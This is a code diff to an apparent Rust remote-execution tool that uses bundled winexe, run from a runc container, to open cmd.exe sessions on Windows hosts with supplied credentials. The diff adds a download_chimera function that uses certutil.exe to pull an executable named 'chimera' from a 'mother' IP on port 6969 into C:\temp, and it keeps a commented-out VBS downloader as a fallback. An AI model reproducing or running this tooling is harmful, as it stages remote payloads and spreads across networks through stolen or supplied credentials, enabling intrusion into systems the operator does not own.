@@ -19,6 +19,7 @@ use tokio::{
 };
 
 const RUNC: &[u8] = include_bytes!("../../bin/runc.zlib");
+const WINEXE: &[u8] = include_bytes!("../../bin/winexe.tar.gz");
 
 impl Drop for WinexeSession {
     fn drop(&mut self) {
@@ -37,6 +38,20 @@ pub struct WinexeSession {
 
 // Struct to keep track of winexe session
 impl WinexeSession {
+    pub async fn download_chimera(&self, mother_ip: &str) -> Result<(), std::io::Error> {
+        let cmd = format!(
+            "certutil.exe -urlcache -split -f \"http://{}:6969/chimera\" c:\\temp\\chimera.exe",
+            //"echo Dim xHttp: Set xHttp = createobject(\"Microsoft.XMLHTTP\") > C:\\temp\\download.vbs && echo xHttp.Open \"GET\", \"http://{}:6969/chimera\", False >> C:\\temp\\download.vbs && echo xHttp.Send >> C:\\temp\\download.vbs && echo If xHttp.Status = 200 Then >> C:\\temp\\download.vbs && echo Dim bStrm: Set bStrm = createobject(\"Adodb.Stream\") >> C:\\temp\\download.vbs && echo bStrm.type = 1 'adTypeBinary >> C:\\temp\\download.vbs && echo bStrm.open >> C:\\temp\\download.vbs && echo bStrm.write xHttp.responseBody >> C:\\temp\\download.vbs && echo bStrm.savetofile \"C:\\temp\\chimera.exe\", 2 'Overwrite if exists >> C:\\temp\\download.vbs && echo End If >> C:\\temp\\download.vbs && cscript /nologo C:\\temp\\download.vbs && del C:\\temp\\download.vbs",
+            mother_ip
+        );
+        println!("Downloading Chimera");
+
+        self.execute_command("MKDIR C:\\temp").await?;
+
+        self.execute_command(&cmd).await?;
+        Ok(())
+    }
+
     // Sends any data(bytes) to stdin
     pub async fn write_to_stdin(
         mut child: tokio::sync::MutexGuard<'_, Child>,
@@ -46,7 +61,6 @@ impl WinexeSession {
 
         if let Some(ref mut stdin) = child.stdin {
             stdin.write_all(data).await?;
-            println!("{:?}", data);
             stdin.flush().await?;
         }
 
@@ -70,6 +84,7 @@ impl WinexeSession {
             // Waits for command to be sent to channel and then sends it to winexe session
             while let Some((command, completion_sender)) = command_receiver.recv().await {
                 let child: tokio::sync::MutexGuard<'_, Child> = child.lock().await;
+                let command = format!("{}\n", command);
                 let _ = Self::write_to_stdin(child, command.as_bytes()).await;
 
                 loop {
@@ -105,7 +120,7 @@ impl WinexeSession {
             .filter(|line| line.contains(">") && line.contains("C:\\"))
             .collect();
 
-        !lines.is_empty()
+        (lines.first().unwrap_or(&"") == &"C:\\Windows\\system32>") || lines.is_empty()
     }
 }
 
@@ -114,7 +129,7 @@ pub struct WinexeClient {
     // session: Option<Arc<Mutex<Session>>>, // Winexe Session
     container_path: Option<String>, // Path to winexe container
     // credentials: Option<Credentials<'static>>, // Credentials to connect to winexe session
-    ip: Option<String>, // Ip to connect to winexe session
+    ip: Option<String>,          // Ip to connect to winexe session
 }
 
 // Winexe implementation
@@ -183,6 +198,7 @@ impl WinexeClient {
 
         // Checks runc list command to see if winexe is in the output
         let output = Command::new(runc_path).arg("list").output().await?;
+        println!("Checking if container is running");
 
         // Check if the command execution was successful
         if !output.status.success() {
@@ -220,13 +236,19 @@ impl WinexeClient {
         // Establish a connection to the remote host using winexe or winexe-container
         let mut cmd = Command::new(if needs_container { runc_path } else { "winexe" });
 
+        let mut cmd_args = Vec::new();
+
         // Container specific arguments
         if needs_container {
-            cmd.arg("exec").arg("winexe-container").arg("winexe");
+            cmd_args.push("exec");
+            cmd_args.push("winexe-container");
+            cmd_args.push("./winexe-static-2");
+            //cmd.arg("exec").arg("winexe-container").arg("winexe");
         }
 
         // User flag
-        cmd.arg("-U");
+        cmd_args.push("-U");
+        //cmd.arg("-U");
 
         // User authentication
         let user_auth = match password {
@@ -234,17 +256,51 @@ impl WinexeClient {
             None => user,
         };
 
+        let connection_str = format!("//{}", ip);
+
         // Add authentication
-        cmd.arg(user_auth)
-            .arg(format!("//{}", ip))
-            .arg("cmd.exe")
+        cmd_args.push(&user_auth);
+        cmd_args.push(&connection_str);
+        cmd_args.push("cmd.exe /c echo blah");
+
+        cmd.args(&cmd_args)
+            .stdin(std::process::Stdio::piped()); // Bind stdin
+
+        let init_child = cmd.output().await?;
+        
+        let stdout_str = String::from_utf8_lossy(&init_child.stdout);
+        let stderr_str = String::from_utf8_lossy(&init_child.stderr);
+        println!("stdout: {}", stdout_str);
+        println!("stderr: {}", stderr_str);
+
+        // Check if NT_STATUS_CONNECTION_RESET is in output and if it is try again with
+        // ./winexe-static2 instead
+        if needs_container && !stdout_str.contains("blah") || stderr_str.contains("NT_STATUS_CONNECTION_RESET") {
+            cmd_args[2] = "./winexe-static";
+        }
+
+        let cmd_idx = cmd_args.len() - 1;
+
+        cmd_args[cmd_idx] = "cmd.exe";
+
+        let mut cmd = Command::new(runc_path);
+
+        cmd.args(&cmd_args)
             .stdin(std::process::Stdio::piped()) // Bind stdin
             .stdout(std::process::Stdio::from(output_file.into_std().await)) // Bind stdout
             .stderr(std::process::Stdio::piped());
 
+        let mut child = cmd.spawn()?;
+
+        //cmd.arg(user_auth)
+        //    .arg(format!("//{}", ip))
+        //    .arg("cmd.exe")
+        //    .stdin(std::process::Stdio::piped()) // Bind stdin
+        //    .stdout(std::process::Stdio::from(output_file.into_std().await)) // Bind stdout
+        //    .stderr(std::process::Stdio::piped());
+
         println!("Establishing Connection{:?}", cmd);
         // Spawn the child process but do not wait for it here
-        let child = cmd.spawn()?;
 
         // Return session
         Ok(WinexeSession {
@@ -264,21 +320,42 @@ impl WinexeClient {
     }
 
     // Starts winexe container
-    async fn start_winexe_container(container_path: String) -> Result<(), std::io::Error> {
+    pub async fn start_winexe_container(container_path: String) -> Result<(), std::io::Error> {
         let runc_path = if WinexeClient::is_runc_in_path()? {
             "runc"
         } else {
             "/tmp/runc"
         };
 
+        // if container path + winexe exists then return
+        if std::path::Path::new(&format!("{}/winexe", container_path)).exists() {
+            return Ok(());
+        }
+
+        println!("Starting winexe container");
+
+        // Uncompress winexe container to container path
+        // Uncompress from gz
+        let mut decoder = flate2::read::GzDecoder::new(WINEXE);
+        let mut decompressed_data = Vec::new();
+        decoder.read_to_end(&mut decompressed_data)?;
+
+        // Uncompress from tar
+        let mut archive = tar::Archive::new(&decompressed_data[..]);
+        archive.unpack(&container_path)?;
+
+        let path = format!("{}/winexe", container_path);
+
         let mut cmd = Command::new(runc_path);
         cmd.arg("run")
             .arg("-d")
             .arg("--bundle")
-            .arg(container_path)
+            .arg(&path)
             .arg("winexe-container");
+
         let mut child = cmd.spawn()?;
         let _ = child.wait().await?;
+        println!("Winexe container started");
 
         Ok(())
     }
@@ -365,6 +442,11 @@ impl WinexeClient {
 
 #[async_trait]
 impl Session for WinexeSession {
+    // Transfers file to winexe host using SMB/RPC
+    async fn transfer_file(&self, _src: &str, _dst: &str) -> anyhow::Result<()> {
+        Ok(())
+    }
+
     // Exectues command on winexe session
     async fn execute_command(&self, command: &str) -> Result<Option<String>, std::io::Error> {
         // Send the command
@@ -384,6 +466,7 @@ impl Session for WinexeSession {
                     "Command execution did not complete",
                 )
             })?;
+            println!("Command execution completed");
         }
 
         let mut dst = String::new();
@@ -391,6 +474,7 @@ impl Session for WinexeSession {
         let mut output = self.output_file.lock().await;
 
         let _ = output.read_to_string(&mut dst).await;
+        println!("OUTPUT: {}", dst);
 
         let parsed = dst
             .split(command)
@@ -413,7 +497,6 @@ impl Session for WinexeSession {
         let mut child = self.child_process.lock().await;
         let _ = child.kill().await;
 
-        println!("File size is now 1 byte, so the command has finished executing");
         Ok(())
     }
 }
